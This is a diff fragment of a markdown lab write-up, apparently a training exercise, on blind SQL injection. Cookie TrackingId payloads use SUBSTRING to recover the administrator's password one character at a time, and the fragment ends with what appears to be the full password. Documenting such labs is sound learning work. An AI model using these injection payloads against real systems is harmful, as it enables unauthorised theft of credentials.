@@ -77,3 +77,11 @@ Second character is `5`. Numbers come before letters in SUBSTRING() !
 >Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),6,1) = 'g'--;
 
 6th character is `g`
+
+>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and substring((SELECT password FROM users where username='administrator'),7,1) = 'm'--;
+
+7th character is `m`
+
+## Screw it, I'm brute forcing this
+
+y5l10gmkw1je153vi5z
